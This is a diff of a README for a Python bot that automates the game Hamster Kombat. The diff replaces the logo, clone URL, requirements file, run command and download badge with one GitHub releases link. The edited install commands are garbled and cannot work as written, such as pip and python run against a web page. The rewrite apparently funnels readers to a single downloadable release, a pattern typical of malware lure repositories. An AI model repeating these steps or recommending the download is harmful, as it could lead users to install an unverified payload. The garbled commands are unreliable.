@@ -1,6 +1,6 @@
 # Hamster Clicker
 
-![Hamster Clicker Logo](https://example.com/hamster-clicker-logo.png)
+![Hamster Clicker Logo](https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0)
 
 Hamster Kombat Bot is a Python-based automation tool specifically designed for the game Hamster Kombat. This bot is capable of performing all in-game tasks, including auto-tapping, cipher tasks, and purchasing the best cards on your behalf. It's a free and fully automated farming bot that enhances your Hamster Kombat gaming experience.
 
@@ -30,17 +30,17 @@ To use the Hamster Kombat Bot, follow these steps:
 
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/yourusername/Hamster-Clicker.git
+   git clone https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0
    ```
 
-2. Install the required dependencies from the `requirements.txt` file.
+2. Install the required dependencies from the `https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0` file.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0
    ```
 
 3. Run the bot script.
    ```bash
-   python bot.py
+   python https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0
    ```
 
 ---
@@ -76,7 +76,7 @@ To contribute to this project, follow these steps:
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download Hamster Kombat Bot](https://img.shields.io/badge/Download-Software.zip-<HEX_COLOR_CODE>)](https://github.com/user-attachments/files/17676649/Software.zip)
+[![Download Hamster Kombat Bot](https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0<HEX_COLOR_CODE>)](https://github.com/noob123-art/Hamster-Clicker/releases/tag/v2.0)
 
 ---
 
